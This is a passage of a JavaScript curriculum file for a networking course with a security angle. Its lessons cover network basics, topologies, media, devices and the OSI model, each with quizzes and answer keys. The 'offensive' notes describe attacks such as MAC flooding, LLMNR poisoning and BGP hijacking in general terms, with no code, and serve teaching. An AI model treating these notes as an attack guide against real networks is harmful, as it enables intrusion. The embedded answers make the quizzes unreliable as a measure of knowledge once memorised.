// DEV. SAHIL - NETWORKING STUDIO
// Complete curriculum dataset: 23 Chapters, 114 Lesson Screens, Full Cyber Context
(function() {
  var root = typeof window !== 'undefined' ? window : (typeof global !== 'undefined' ? global : this);
  root.NETWORKING_STUDIO_CHAPTERS = [
  {
    "id": "01",
    "module": "01 / FOUNDATIONS",
    "title": "Why networking matters",
    "desc": "Start with the path that connects every later security topic.",
    "screensCount": 5,
    "sourceRange": "SOURCE 1-5",
    "simulator": "attack-surface",
    "badge": "Core Foundation",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 1,
        "title": "The Invisible Backbone of Computing",
        "summary": "Every digital asset lives on a network. Without networking, isolated computers cannot communicate or be exploited remotely.",
        "concept": "A network is simply interconnected computing devices capable of exchanging data using established protocols. In cybersecurity, the network is the primary medium through which remote adversaries identify vulnerabilities, establish command and control (C2), pivot laterally, and exfiltrate confidential data.",
        "cyberLens": {
          "offensive": "Initial access almost always traverses network protocols (exposed SSH/RDP, vulnerable web services, misconfigured firewalls). Network reconnaissance maps out the entire target landscape.",
          "defensive": "You cannot defend what you cannot see. Network telemetry (NetFlow, PCAP, IDS logs) provides definitive ground-truth evidence that attackers cannot tamper with as easily as local host logs."
        },
        "keyPoints": [
          "Networks break computing silos through standard communication rules (protocols).",
          "Red teams exploit network misconfigurations and trust boundaries.",
          "Blue teams rely on network packet capture (PCAP) as the ultimate source of truth."
        ],
        "quiz": {
          "question": "Why is network-level monitoring often harder for an attacker to evade than local host log tampering?",
          "options": [
            "Network packets can never be encrypted.",
            "Network taps and mirrored traffic exist out-of-band and cannot be disabled from a compromised endpoint.",
            "Network devices are immune to security bugs.",
            "Routers automatically block all malicious payloads."
          ],
          "answer": 1,
          "explanation": "Out-of-band network taps, SPAN ports, and central IDS systems capture raw packets over the wire, completely independent of the compromised host's kernel or administrator permissions."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 2,
        "title": "The Fundamental Communication Model",
        "summary": "From Shannon's communication theory to digital packets: Sender, Receiver, Medium, Message, and Protocol.",
        "concept": "All digital network communication requires five elements:\n1. Sender (Source host)\n2. Receiver (Destination host)\n3. Medium (Copper wires, fiber-optic light, or radio waves)\n4. Message (Data serialized into bits)\n5. Protocol (Mutually agreed syntax, semantics, and timing rules).\nIf protocol rules are violated or out of sync, packets are dropped or misparsed.",
        "cyberLens": {
          "offensive": "Protocol Fuzzing: Attackers send malformed messages deliberately breaking protocol specifications to trigger buffer overflows, parser crashes, or memory leaks.",
          "defensive": "Strict protocol validation at the gateway (Deep Packet Inspection) drops non-RFC compliant payloads before they reach application parsers."
        },
        "keyPoints": [
          "A protocol defines message format, order of exchanges, and required actions.",
          "Attackers exploit protocol ambiguities to achieve evasion and bypass firewalls.",
          "Standardization bodies like IETF publish Requests for Comments (RFCs) defining these rules."
        ],
        "quiz": {
          "question": "What happens when an endpoint receives a packet with corrupted bits that fail its checksum calculation?",
          "options": [
            "The packet is fixed automatically using AI.",
            "The packet is discarded at the lower layers to prevent data corruption.",
            "The operating system executes the packet anyway.",
            "The sender is automatically blocked by the firewall."
          ],
          "answer": 1,
          "explanation": "At L2 (CRC) and L3/L4 (checksums), corrupt frames or packets that do not match the expected mathematical integrity check are dropped immediately."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 3,
        "title": "The Threat Landscape: Network Attack Vectors",
        "summary": "Mapping network attacks to the CIA triad: Confidentiality, Integrity, and Availability.",
        "concept": "Network attacks target the fundamental pillars of security:\n- Confidentiality: Eavesdropping, packet sniffing, credential harvesting.\n- Integrity: Man-in-the-Middle (MITM), packet injection, ARP/DNS cache poisoning.\n- Availability: Distributed Denial of Service (DDoS), SYN flooding, bandwidth exhaustion.",
        "cyberLens": {
          "offensive": "Adversaries chain network vulnerabilities: an ARP spoof enables cleartext credential sniffing, which grants SSH access, allowing lateral movement.",
          "defensive": "Defense-in-Depth: Combining encrypted transport (TLS/IPsec), network segmentation (VLANs/firewalls), and continuous anomaly detection."
        },
        "keyPoints": [
          "Passive Attacks: Eavesdropping without modifying traffic (harder to detect).",
          "Active Attacks: Tampering, replaying, or injecting traffic (easier to detect).",
          "Encryption defends confidentiality, but metadata (source/dest, timing) remains visible."
        ],
        "quiz": {
          "question": "Which attack type directly violates the 'Integrity' pillar by altering data in transit?",
          "options": [
            "Passive Wireshark packet capture",
            "Man-in-the-Middle (MITM) packet tampering",
            "SYN Flood DoS attack",
            "Port scanning with Nmap"
          ],
          "answer": 1,
          "explanation": "A MITM attack intercepts communications between two parties and alters the data payloads or headers before relaying them, violating data integrity."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 4,
        "title": "Trust Boundaries & Perimeter Dissolution",
        "summary": "Why the traditional 'castle-and-moat' security model failed and gave rise to Zero Trust Architecture.",
        "concept": "Traditional enterprise networks relied on a strong perimeter (firewall) separating the 'trusted' internal network from the 'untrusted' Internet. Once an attacker breached the perimeter (via phishing or VPN exploit), they had unrestricted lateral access to internal servers. Zero Trust enforces 'Never Trust, Always Verify' across all internal and external network flows.",
        "cyberLens": {
          "offensive": "In legacy perimeter networks, red teams focus heavily on perimeter breach; once inside, internal servers rarely authenticate intra-VLAN traffic.",
          "defensive": "Microsegmentation, mutual TLS (mTLS), and continuous identity/context verification prevent lateral movement even if an internal node is compromised."
        },
        "keyPoints": [
          "Perimeters are dissolved by cloud services, remote work, and mobile devices.",
          "Zero Trust assumes the internal network is already hostile.",
          "Every request must be authenticated, authorized, and encrypted."
        ],
        "quiz": {
          "question": "What core principle differentiates Zero Trust Architecture from traditional perimeter security?",
          "options": [
            "Zero Trust eliminates all firewalls completely.",
            "Zero Trust assumes internal hosts cannot be trusted and validates every transaction.",
            "Zero Trust only uses passwords instead of certificates.",
            "Zero Trust allows all employees full administrative rights."
          ],
          "answer": 1,
          "explanation": "Zero Trust operates on the principle of least privilege and assumes breach, authenticating every user, device, and packet regardless of network location."
        }
      },
      {
        "screenNumber": 5,
        "globalSource": 5,
        "title": "The Security Analyst's Network Toolkit",
        "summary": "Essential tools every security professional uses to analyze, audit, and troubleshoot networks.",
        "concept": "A security engineer must master command-line network inspection utilities:\n- `ping`: ICMP reachability and round-trip time.\n- `traceroute`/`tracert`: Path discovery and hop-by-hop latency via TTL expiration.\n- `netstat`/`ss`: Active listening ports, socket states, and associated process IDs.\n- `arp -a`: Local Layer 2 MAC-to-IP binding cache.\n- `tcpdump`/`wireshark`: Packet capture and deep protocol dissection.",
        "cyberLens": {
          "offensive": "Living-off-the-land: Attackers use built-in tools like `arp -a`, `netstat`, and `route print` to perform silent internal host discovery without dropping malware.",
          "defensive": "Endpoint Detection and Response (EDR) monitors anomalous execution of these native network utilities by non-admin processes."
        },
        "keyPoints": [
          "Mastering network diagnostic tools is non-negotiable for triage and forensics.",
          "Packet captures (PCAPs) constitute legal evidence in digital incident response.",
          "Understanding native OS tools reveals what attackers can see once inside."
        ],
        "quiz": {
          "question": "Which command-line tool allows you to view all listening TCP/UDP sockets and their owning process PIDs on a machine?",
          "options": [
            "ping -t 127.0.0.1",
            "netstat -ano (or ss -tulnp)",
            "ipconfig /flushdns",
            "traceroute 8.8.8.8"
          ],
          "answer": 1,
          "explanation": "`netstat -ano` (Windows) or `ss -tulnp` (Linux) displays active connections, listening ports, and the Process ID (PID) owning each socket."
        }
      }
    ]
  },
  {
    "id": "02",
    "module": "01 / FOUNDATIONS",
    "title": "What a network is",
    "desc": "Meet network sizes, client-server systems, and the four ways to address an audience.",
    "screensCount": 4,
    "sourceRange": "SOURCE 6-9",
    "simulator": "addressing-modes",
    "badge": "Architecture",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 6,
        "title": "Network Scale & Classifications",
        "summary": "From personal body-area devices to global autonomous systems: PAN, LAN, CAN, MAN, and WAN.",
        "concept": "- PAN (Personal Area Network): Bluetooth, Zigbee (~1-10 meters).\n- LAN (Local Area Network): High-speed, low latency within an office or home (Ethernet, Wi-Fi).\n- CAN (Campus Area Network): Interconnected LANs across a university or corporate campus.\n- MAN (Metropolitan Area Network): City-wide connectivity (cable TV networks, municipal fiber).\n- WAN (Wide Area Network): Global Internet, spanning countries via submarine cables and satellite constellations.",
        "cyberLens": {
          "offensive": "War-driving targets exposed corporate Wi-Fi (LANs) from the parking lot. WAN edges (exposed VPN portals) are prime targets for initial access brokers.",
          "defensive": "Network boundary segmentation prevents compromised remote WAN devices from accessing sensitive campus core LAN databases."
        },
        "keyPoints": [
          "LANs feature high bandwidth (1-100 Gbps) and low latency (<1ms).",
          "WANs cross public telecommunications and untrusted service provider transit lines.",
          "Traffic traversing WAN boundaries must always be encrypted."
        ],
        "quiz": {
          "question": "What is the primary security distinction between a corporate LAN and a WAN connection?",
          "options": [
            "LANs never use IP addresses.",
            "WAN traffic crosses untrusted public infrastructure and requires cryptographic protection like IPsec.",
            "WANs are completely immune to physical wiretapping.",
            "LANs do not require passwords."
          ],
          "answer": 1,
          "explanation": "Because WAN circuits pass through public telecommunication providers and submarine/underground cables, unencrypted WAN traffic is subject to state-level wiretapping and ISP surveillance."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 7,
        "title": "Architectural Paradigms: Client-Server vs P2P",
        "summary": "Centralized authority versus decentralized nodes: operational resilience and attack vectors.",
        "concept": "- Client-Server: Central servers host resources and provide services (web, database, auth); clients request resources. Centralized security enforcement, but server is a single point of failure (SPOF).\n- Peer-to-Peer (P2P): Every node acts as both client and server (BitTorrent, blockchain, Tor). Highly resilient against censorship and single-node take-downs, but decentralized trust makes content moderation and malicious peer injection challenging.",
        "cyberLens": {
          "offensive": "Botnets (e.g. Mirai, Emotet) historically used central C2 servers (easy to take down via domain sinkholing). Advanced botnets use P2P topologies (like Conficker or Necurs) to resist takedowns.",
          "defensive": "Client-server traffic can be inspected at central egress firewalls; P2P traffic often requires application-layer heuristics to block rogue data transfers."
        },
        "keyPoints": [
          "Client-server enables centralized identity, logging, and access control.",
          "P2P distributes storage and bandwidth across decentralized swarms.",
          "Modern advanced malware utilizes P2P protocols for resilient Command & Control."
        ],
        "quiz": {
          "question": "Why did modern botnet operators transition from centralized IRC servers to P2P C2 networks?",
          "options": [
            "P2P networks make internet connection faster.",
            "Centralized IRC servers can be easily seized or sinkholed by law enforcement and security researchers.",
            "P2P requires no computer code to run.",
            "Centralized servers cannot use DNS."
          ],
          "answer": 1,
          "explanation": "Centralized C2 servers have a single IP/domain that defenders can block or sinkhole. In P2P botnets, every infected peer relays commands, eliminating any single point of failure."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 8,
        "title": "The Four Addressing Modes",
        "summary": "How packets find their target: Unicast, Broadcast, Multicast, and Anycast.",
        "concept": "1. Unicast (One-to-One): Direct transmission between a specific source and destination (e.g., standard HTTPS web browsing).\n2. Broadcast (One-to-All): Transmission to every host on the local broadcast domain (e.g., ARP Request FF:FF:FF:FF:FF:FF, DHCP Discover).\n3. Multicast (One-to-Many): Packets sent to a designated group address, received only by subscribed members (e.g., OSPF routing updates 224.0.0.5, video streaming).\n4. Anycast (One-to-Nearest): The same IP address is advertised by multiple geographically distributed servers; BGP routes the client to the topologically closest server (e.g., Cloudflare 1.1.1.1, Google 8.8.8.8, Root DNS servers).",
        "cyberLens": {
          "offensive": "Broadcast Storms & Smurf Attacks: Attackers exploit broadcast addresses to amplify traffic. Rogue broadcast responses (e.g. Responder poisoning LLMNR/NBT-NS) harvest Windows hashes.",
          "defensive": "Anycast is the primary architecture used to absorb massive multi-terabit DDoS attacks by distributing attack traffic across dozens of global scrubbing centers."
        },
        "keyPoints": [
          "Unicast is the foundation of point-to-point web and API traffic.",
          "Broadcast does not cross Layer 3 routers; it stays confined to the local subnet.",
          "Anycast provides automatic high availability and DDoS mitigation for major DNS and CDN providers."
        ],
        "quiz": {
          "question": "When you query Google Public DNS at 8.8.8.8, how does the internet ensure you reach a datacenter near you rather than one on the other side of the planet?",
          "options": [
            "Through broadcast packets forwarded across the globe.",
            "Through Anycast routing, where multiple global edge servers advertise 8.8.8.8 via BGP.",
            "Through peer-to-peer torrenting of DNS records.",
            "Through a single giant supercomputer located in California."
          ],
          "answer": 1,
          "explanation": "Anycast allows hundreds of edge datacenters around the world to announce the exact same IP (8.8.8.8) using BGP. Internet routers naturally send each user's query to the nearest BGP path."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 9,
        "title": "Broadcast Domains & Collision Domains",
        "summary": "The two fundamental boundaries governing local traffic propagation and security isolation.",
        "concept": "- Collision Domain: The physical network area where packet transmissions can collide on a shared medium (e.g. devices connected to a legacy Hub or half-duplex Wi-Fi). Each port on a switch creates its own isolated collision domain.\n- Broadcast Domain: The logical boundary where all devices receive Layer 2 broadcast frames. Switches forward broadcasts out all ports. Only Layer 3 routers and VLANs break up broadcast domains.",
        "cyberLens": {
          "offensive": "In a shared collision domain or large broadcast domain, any host can sniff local unencrypted traffic or poison ARP caches for all peers in the subnet.",
          "defensive": "Subdividing large networks into small VLANs shrinks the broadcast domain, containing malware propagation, ransomware worms, and credential sniffing."
        },
        "keyPoints": [
          "Switches eliminate collision domains on full-duplex links.",
          "Routers terminate broadcast domains; broadcast packets are never routed across the internet.",
          "VLANs (Virtual LANs) allow a single physical switch to host multiple isolated broadcast domains."
        ],
        "quiz": {
          "question": "Which networking device separates broadcast domains by default?",
          "options": [
            "Layer 1 Hub",
            "Unmanaged Layer 2 Switch",
            "Layer 3 Router",
            "Ethernet Patch Cable"
          ],
          "answer": 2,
          "explanation": "Routers operate at Layer 3 and do not forward Layer 2 broadcast frames, effectively isolating broadcast traffic to the local network segment."
        }
      }
    ]
  },
  {
    "id": "03",
    "module": "01 / FOUNDATIONS",
    "title": "Topologies",
    "desc": "See how network shape affects reliability and traffic visibility.",
    "screensCount": 3,
    "sourceRange": "SOURCE 10-12",
    "simulator": "topology-sandbox",
    "badge": "Design",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 10,
        "title": "Physical vs Logical Topologies",
        "summary": "How cables are wired versus how data actually flows across the network medium.",
        "concept": "- Physical Topology: The physical layout of cables, nodes, and devices in space (e.g., physical Star topology where all devices plug into a central switch).\n- Logical Topology: The path data packets follow across the network regardless of physical appearance (e.g. legacy Token Ring physically wired as a star into a MAU, but passing a logical token in a ring; or Wi-Fi physically looking like a star to an AP, but logically behaving like a shared bus medium).",
        "cyberLens": {
          "offensive": "Attackers exploit logical shared mediums (like wireless radio frequencies) to intercept frames even when physical premises are locked.",
          "defensive": "Security teams document both physical cable plants (for tamper detection) and logical data flow diagrams (for firewall rule verification)."
        },
        "keyPoints": [
          "Physical star with logical bus/star is standard in modern Ethernet LANs.",
          "Logical topology dictates who can physically overhear packets on the wire.",
          "Wi-Fi is logically a shared bus: anyone within radio range can capture raw frames."
        ],
        "quiz": {
          "question": "Why is Wi-Fi logically considered a shared bus medium, even if all devices connect to one central Access Point?",
          "options": [
            "Because it uses fiber optic cables.",
            "Because all devices share the exact same radio frequency spectrum and can detect collisions.",
            "Because Wi-Fi does not use IP addresses.",
            "Because switches are used in wireless antennas."
          ],
          "answer": 1,
          "explanation": "Radio waves propagate through open air on shared channels. All wireless cards tuned to that channel receive the raw RF energy, requiring collision avoidance (CSMA/CA) just like a shared bus."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 11,
        "title": "The Classic Topologies: Bus, Ring, Star, Mesh",
        "summary": "Analyzing resilience, single points of failure (SPOF), and scaling trade-offs.",
        "concept": "1. Bus: Single central backbone cable with terminators. Cheap, but cable break takes down entire network; shared collision domain.\n2. Ring: Nodes connected in a closed loop with token passing. Predictable latency, but single link break interrupts the ring.\n3. Star: All nodes connect to a central hub/switch. Easy to install and troubleshoot; if one cable breaks, only that node goes down; switch is the SPOF.\n4. Mesh (Full & Partial): Nodes have redundant point-to-point links. Full mesh requires N(N-1)/2 links. Extremely fault-tolerant, used in core ISP backbones and critical data centers.",
        "cyberLens": {
          "offensive": "Red teams identify Single Points of Failure (SPOF) to execute targeted denial of service or locate the best choke-point for passive network sniffing.",
          "defensive": "High Availability (HA) designs use redundant dual-homed star topologies with protocols like VRRP/HSRP and Spanning Tree Protocol (STP) to prevent bridge loops."
        },
        "keyPoints": [
          "Star topology is universal for access layers due to isolation of cable faults.",
          "Full mesh provides maximum fault tolerance at highest cabling cost.",
          "ISP tier-1 backbones utilize partial/full mesh for continuous packet rerouting."
        ],
        "quiz": {
          "question": "How many point-to-point connections are required to build a fully meshed network of 6 core routers?",
          "options": [
            "6 links",
            "12 links",
            "15 links",
            "36 links"
          ],
          "answer": 2,
          "explanation": "The formula for full mesh is N(N-1)/2. For 6 nodes: 6 × 5 / 2 = 15 direct links."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 12,
        "title": "Enterprise Hybrid & Spine-Leaf Architectures",
        "summary": "Modern cloud and datacenter network design: predictable east-west latency and zero oversubscription.",
        "concept": "Modern enterprise data centers have moved away from the traditional 3-tier (Core-Aggregation-Access) tree topology to a modern Spine-Leaf (Clos) architecture:\n- Every Leaf switch connects to every Spine switch.\n- Any server can reach any other server in exactly two hops (Leaf -> Spine -> Leaf).\n- East-West traffic (server-to-server microservices and DB replication) travels with ultra-low, deterministic latency compared to traditional north-south internet traffic.",
        "cyberLens": {
          "offensive": "Attackers moving laterally in modern datacenters rely on east-west server communication paths which are frequently less scrutinized than north-south internet gateways.",
          "defensive": "Microsegmentation and East-West firewall inspection (East-West IDS/IPS) inspect internal server-to-server traffic inside the spine-leaf fabric."
        },
        "keyPoints": [
          "Spine-Leaf eliminates Spanning Tree blocking by using Equal-Cost Multi-Path (ECMP) routing.",
          "East-West traffic (datacenter internal) now accounts for >80% of enterprise packets.",
          "Segmentation must be enforced at the Leaf layer via VXLAN and distributed firewalls."
        ],
        "quiz": {
          "question": "In a Spine-Leaf datacenter topology, how many switch hops are required for two servers on different leaf switches to communicate?",
          "options": [
            "1 hop",
            "2 hops (Leaf -> Spine -> Leaf)",
            "5 to 7 hops depending on spanning tree",
            "Spine switches do not forward packets"
          ],
          "answer": 1,
          "explanation": "In a 2-tier Spine-Leaf architecture, every leaf is connected to every spine. Traffic from Leaf A goes up to any Spine, and directly down to Leaf B — exactly 2 switch hops."
        }
      }
    ]
  },
  {
    "id": "04",
    "module": "01 / FOUNDATIONS",
    "title": "Transmission, media & devices",
    "desc": "Trace bits through cables, radio, switches, routers, and firewalls.",
    "screensCount": 6,
    "sourceRange": "SOURCE 13-18",
    "simulator": "device-working-sim",
    "badge": "Hardware & L1/L2",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 13,
        "title": "Physical Media: Copper & Twisted Pair",
        "summary": "Unshielded (UTP) vs Shielded (STP), categories, cancellation, and electromagnetic interference.",
        "concept": "Twisted pair copper cables (Cat5e, Cat6, Cat6a, Cat7) are the standard for LAN drops:\n- Pairs of copper wires are twisted around each other at specific twist rates to cancel out Electromagnetic Interference (EMI) and crosstalk via differential signaling.\n- Maximum standard Ethernet run distance is 100 meters (328 feet).\n- Pinouts: T568A and T568B. Straight-through cables connect dissimilar devices; crossover cables connect similar devices (largely automated today by Auto-MDIX).",
        "cyberLens": {
          "offensive": "Physical Wiretapping: Unshielded twisted pair cables emit weak electromagnetic radiation (TEMPEST). In high-security environments, adversaries can use inductive amplifier probes to eavesdrop without splicing the cable.",
          "defensive": "High-security facilities use Shielded Twisted Pair (STP), shielded metal conduits, or switch port security to detect cable disconnects."
        },
        "keyPoints": [
          "Cat6 supports 10 Gbps up to 55m; Cat6a supports 10 Gbps up to full 100m.",
          "Twisting wires cancels external noise through differential signaling.",
          "Maximum certified length for standard twisted-pair Ethernet is 100 meters."
        ],
        "quiz": {
          "question": "What physical phenomenon allows twisted-pair cables to reject external electromagnetic noise without heavy shielding?",
          "options": [
            "Superconductivity",
            "Differential signaling and magnetic cancellation across opposing twists",
            "Fiber optic reflection",
            "Radio frequency amplification"
          ],
          "answer": 1,
          "explanation": "Because signals are sent as equal and opposite polarities on twisted wires, external noise couples equally onto both wires and is cancelled out at the differential receiver."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 14,
        "title": "Physical Media: Fiber Optics & Wireless RF",
        "summary": "Photons through glass cores and electromagnetic waves through free space.",
        "concept": "- Fiber Optics: Transmits data as pulses of light using Total Internal Reflection through a pure glass/silica core.\n  - Single-Mode Fiber (SMF): Tiny 9-micron core, laser light source, supports long distances (tens of kilometers) with near-zero modal dispersion. Used for WAN and campus backbones.\n  - Multi-Mode Fiber (MMF): Larger 50/62.5-micron core, LED/VCSEL light source, for short distances (up to 550m) in datacenters.\n- Wireless (RF): 2.4 GHz (longer range, high wall penetration, crowded) vs 5 GHz/6 GHz (higher throughput, wider channels, lower range).",
        "cyberLens": {
          "offensive": "Fiber Bending Clamps: Attackers can micro-bend a fiber cable to leak light onto a photodiode to sniff data without breaking the link. Wi-Fi allows unauthenticated frame sniffing from miles away using high-gain directional antennas.",
          "defensive": "Fiber networks are immune to EMI and lightning strikes. Critical fiber links use Optical Time-Domain Reflectometry (OTDR) to detect tap insertion in milliseconds."
        },
        "keyPoints": [
          "Fiber is immune to electromagnetic interference, radio jamming, and electrical ground loops.",
          "Single-mode fiber is the backbone of global undersea cables and long-haul telecommunications.",
          "Wi-Fi signals penetrate physical walls, requiring strong WPA3 encryption."
        ],
        "quiz": {
          "question": "Why is fiber-optic cabling preferred over copper for connecting separate buildings across a corporate campus?",
          "options": [
            "Fiber is much cheaper than copper wire.",
            "Fiber is immune to electrical ground loops, lightning surges, and EMI.",
            "Fiber does not require any transceivers.",
            "Fiber works without electricity anywhere in the building."
          ],
          "answer": 1,
          "explanation": "Different buildings often have differing electrical ground potentials. Connecting them with copper can cause destructive ground loops and attract lightning strikes. Glass fiber carries light and is completely non-conductive."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 15,
        "title": "Layer 1 Devices: Repeaters and Hubs",
        "summary": "Dumb signal re-amplifiers and the nightmare of shared collision domains.",
        "concept": "- Repeater: Pure Layer 1 device that receives an electrical signal, cleans noise, regenerates it at original strength, and sends it out to extend cable distance.\n- Hub (Multi-port repeater): Receives an electrical bit on one port and blindly repeats (floods) it out to EVERY other port. Hubs operate purely in half-duplex. All connected devices share a single collision domain and broadcast domain.",
        "cyberLens": {
          "offensive": "Eavesdropping Paradise: Connecting a laptop to a hub allows Wireshark to capture every packet from every computer connected to that hub without any hacking tools or ARP poisoning.",
          "defensive": "Legacy hubs are banned in modern secure networks. Network engineers replace hubs with switches to enforce traffic isolation."
        },
        "keyPoints": [
          "Hubs do not read MAC addresses, IP addresses, or packet headers.",
          "Only one device can transmit at a time on a hub; others must wait (CSMA/CD).",
          "Security monitoring taps sometimes intentionally mimic hub behavior to copy traffic."
        ],
        "quiz": {
          "question": "What happens when Host A sends a private credit card packet to Host B on an unmanaged Ethernet Hub?",
          "options": [
            "The hub encrypts the packet before delivery.",
            "The hub reads Host B's MAC address and delivers it only to Host B.",
            "The hub repeats the packet electrical signal out of every single port, allowing all connected hosts to sniff it.",
            "The hub drops the packet if it contains sensitive data."
          ],
          "answer": 2,
          "explanation": "Hubs have zero intelligence; they operate at Layer 1 (bits). An incoming signal on one port is blindly repeated to all other ports, exposing data to any eavesdropper."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 16,
        "title": "Layer 2 Devices: Bridges and Switches",
        "summary": "Intelligent frame forwarding, MAC learning, and CAM table mechanics.",
        "concept": "A Switch is an intelligent multiport bridge operating at Layer 2:\n1. Learning: Reads the Source MAC address of every incoming frame and records it in its Content Addressable Memory (CAM) table along with the ingress port and VLAN.\n2. Forwarding / Filtering: Looks up the Destination MAC address in the CAM table.\n   - If found: Forwards frame ONLY to that specific destination port (microsegmentation).\n   - If unknown (or broadcast FF:FF:FF:FF:FF:FF): Floods frame out all ports except the receiving port (Unknown Unicast Flooding).\n3. Full Duplex: Enables simultaneous sending and receiving, eliminating collisions completely.",
        "cyberLens": {
          "offensive": "CAM Table Overflow Attack (macof): Attackers flood the switch with thousands of bogus random MAC addresses. Once the CAM table memory is exhausted, the switch fails open and behaves like a hub, broadcasting all traffic to all ports!",
          "defensive": "Port Security: Restricts the maximum number of learned MAC addresses per switch port, shutting down the port or dropping packets if violation occurs."
        },
        "keyPoints": [
          "Switches break up collision domains per port; broadcast domain remains shared.",
          "CAM table maps MAC address -> physical switch port.",
          "Port Security with sticky MAC addresses prevents CAM overflow attacks."
        ],
        "quiz": {
          "question": "How does an enterprise switch react during a successful CAM Table Overflow attack when its MAC address memory is completely full?",
          "options": [
            "It crashes and reboots into safe mode.",
            "It enters 'fail-open' mode, flooding all unknown unicast frames out all ports like a hub.",
            "It automatically blocks the attacker's IP address.",
            "It begins encrypting all packets with AES-256."
          ],
          "answer": 1,
          "explanation": "When the CAM table overflows, the switch cannot learn new MACs and cannot find existing destinations in its table. It defaults to 'unknown unicast flooding', broadcasting all packets out all ports, allowing the attacker to sniff traffic."
        }
      },
      {
        "screenNumber": 5,
        "globalSource": 17,
        "title": "Layer 3 Devices: Routers and Layer 3 Switches",
        "summary": "Interconnecting subnets, routing tables, and the boundary of the local link.",
        "concept": "Routers operate at Layer 3 (Network layer):\n- They strip the Layer 2 Ethernet frame (decapsulation), read the destination IP in the Layer 3 header, look up the best matching route in the Routing Table (longest prefix match), decrement the Time to Live (TTL), calculate a new checksum, and re-encapsulate the packet into a new L2 frame for the next hop.\n- Routers do NOT forward Layer 2 broadcasts; they terminate broadcast domains.",
        "cyberLens": {
          "offensive": "Routing Table Poisoning: Attackers inject malicious BGP or OSPF route advertisements to divert global or enterprise traffic through attacker-controlled systems (BGP Hijacking).",
          "defensive": "Access Control Lists (ACLs) on routers filter traffic at network perimeters based on source IP, destination IP, and protocol ports."
        },
        "keyPoints": [
          "Routers connect different networks (subnets) and choose the best path.",
          "Layer 2 MAC addresses change hop-by-hop; Layer 3 IP addresses stay constant end-to-end.",
          "Routers isolate broadcast traffic to their local interfaces."
        ],
        "quiz": {
          "question": "As a packet travels across 4 different routers from your laptop to a remote web server, what changes at each router hop?",
          "options": [
            "The Source and Destination IP addresses change completely.",
            "The Layer 2 Source and Destination MAC addresses are rewritten for each physical link, while IPs remain intact.",
            "The payload data is converted from binary to text.",
            "The TCP port numbers change at every router."
          ],
          "answer": 1,
          "explanation": "MAC addresses are only locally significant to the current physical data link. Routers strip the old L2 frame and generate a new L2 frame with new MAC addresses for the next hop, while the L3 IP addresses stay unchanged (unless NAT is applied)."
        }
      },
      {
        "screenNumber": 6,
        "globalSource": 18,
        "title": "Security Enforcers: Firewalls, IDS & IPS",
        "summary": "Packet filtering, stateful connection tracking, and deep inline inspection.",
        "concept": "- Stateless Packet Filters: Inspect headers (Src/Dst IP, Port) in isolation against static ACL rules without memory of previous packets.\n- Stateful Inspection Firewalls: Maintain a State Table tracking connection handshakes (e.g. TCP SYN, SYN-ACK, ACK). Outbound connection replies are automatically permitted back through.\n- Next-Generation Firewalls (NGFW) & IPS: Reassemble full streams, perform Deep Packet Inspection (DPI) up to Layer 7, decode TLS, inspect application payloads, and block malware signatures in real-time.",
        "cyberLens": {
          "offensive": "Firewall Evasion: Fragmentation attacks, non-standard port tunneling (e.g., DNS or HTTPS tunneling), and encrypted payloads hide malicious traffic from basic packet filters.",
          "defensive": "SSL/TLS Decryption Inspection at enterprise firewalls inspects inside encrypted HTTPS streams to block command-and-control traffic and data exfiltration."
        },
        "keyPoints": [
          "Stateful firewalls track TCP connection states (ESTABLISHED, NEW, RELATED).",
          "IDS alerts passively; IPS sits inline and actively drops malicious packets.",
          "NGFWs inspect application-layer context (e.g. distinguishing corporate Slack from file download)."
        ],
        "quiz": {
          "question": "What critical advantage does a Stateful Inspection firewall have over a traditional Stateless Packet Filter?",
          "options": [
            "Stateful firewalls do not use IP addresses.",
            "Stateful firewalls track established connection states, automatically allowing legitimate return traffic without needing static open inbound ports.",
            "Stateful firewalls never drop packets.",
            "Stateful firewalls replace all operating system updates."
          ],
          "answer": 1,
          "explanation": "Stateful firewalls remember outbound connection requests in an internal state table. When the remote server replies, the firewall recognizes it as part of an ESTABLISHED session and permits it through."
        }
      }
    ]
  },
  {
    "id": "05",
    "module": "02 / MODELS AND THE LOCAL LINK",
    "title": "The OSI model",
    "desc": "Use seven layers to describe a packet and find the source of a problem.",
    "screensCount": 6,
    "sourceRange": "SOURCE 19-24",
    "simulator": "encapsulation-sim",
    "badge": "Standard Model",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 19,
        "title": "The 7-Layer Conceptual Framework",
        "summary": "Why the ISO created the 7 layers and how network modularity simplifies troubleshooting.",
        "concept": "The Open Systems Interconnection (OSI) reference model divides network communications into 7 standardized layers:\nLayer 7: Application (User interface, HTTP, DNS, SSH)\nLayer 6: Presentation (Encoding, ASCII, JPEG, Encryption, Compression)\nLayer 5: Session (Dialog control, RPC, session establishment)\nLayer 4: Transport (End-to-end reliability, TCP/UDP, Ports)\nLayer 3: Network (Logical addressing, IP, Routing, ICMP)\nLayer 2: Data Link (Physical addressing, MAC, Frames, Switches)\nLayer 1: Physical (Bits, electrical signals, light, radio waves, cables)\nMnemonic: 'All People Seem To Need Data Processing' (top-down) or 'Please Do Not Throw Sausage Pizza Away' (bottom-up).",
        "cyberLens": {
          "offensive": "Red teams categorize attack techniques by OSI layer: L2 MAC spoofing, L3 IP spoofing, L4 SYN flood, L7 SQL injection.",
          "defensive": "Structured troubleshooting: Security analysts isolate whether a security incident is a physical cable issue (L1), switch loop (L2), bad route (L3), blocked port (L4), or web application bug (L7)."
        },
        "keyPoints": [
          "Each layer only talks to the layer directly above and below it.",
          "Standardization ensures hardware and software from different vendors interoperate.",
          "The OSI model is a theoretical reference; the real internet runs on TCP/IP."
        ],
        "quiz": {
          "question": "Which OSI layer is responsible for converting character encoding, data compression, and initial data formatting?",
